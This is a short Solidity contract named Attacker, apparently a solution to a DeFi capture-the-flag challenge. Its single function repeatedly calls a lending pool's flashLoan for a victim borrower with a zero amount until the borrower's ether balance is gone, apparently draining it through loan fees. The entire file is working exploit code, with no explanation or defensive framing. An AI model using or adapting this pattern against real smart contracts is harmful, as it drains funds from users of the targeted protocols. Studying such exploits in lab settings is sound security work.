// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Attacker {
    function hitFlashLoan(address _pool, address _borrower) external payable {
        while (_borrower.balance > 0) {
            (bool success,) = _pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", _borrower, 0));
            require(success, "call to pool failed");
        }
    }
}
